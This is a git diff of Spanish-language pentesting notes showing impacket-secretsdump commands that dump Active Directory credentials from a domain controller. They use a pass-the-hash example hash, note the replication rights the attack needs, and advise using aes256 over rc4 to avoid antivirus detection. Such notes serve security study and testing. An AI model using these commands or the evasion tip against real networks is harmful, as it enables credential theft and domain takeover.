@@ -66,14 +66,15 @@ Es común que estos archivos sean el objetivo principal de herramientas de extra
 
 ```powershell
 ❯ impacket-secretsdump domain1.corp/user@IP-DC 
-❯ impacket-secretsdump -debug -dc-ip <IP> admin@domain1.corp -hashes :64fbae31cc352fc26af97cbdef151e03 
+❯ impacket-secretsdump domain1.corp/user:passwd@IP_DC
+❯ impacket-secretsdump -debug -dc-ip IP_DC admin@domain1.corp -hashes :64fbae31cc352fc26af97cbdef151e03 
 	
 	# debug = Obtener mas info 
 	# dc-ip = Dirección IP del DC
 	# upn 'UserPrincipalName' = Nombre del usuario y DC
-	# hashes = Hash del usuario 'NTLM'
+	# hashes = Hash ':NT' del usuario 
 
 Notas: 
-	1. Es mejor hacer un 'Pass-The-Hash' con el 'aes256' que con el 'rc4' ya que los AV los detectan más fácil 
-	2. Tener credenciales validas para que funcione 
+	1. Este ataque funciona si el usuario del cual tenemos las credenciales tiene los derechos de 'GetChanges y GetChangesAll' sobre el usuario 'Administrator'  
+	2. Es mejor hacer un 'Pass-The-Hash' con el 'aes256' que con el 'rc4' ya que los AV los detectan más fácil 
 ```
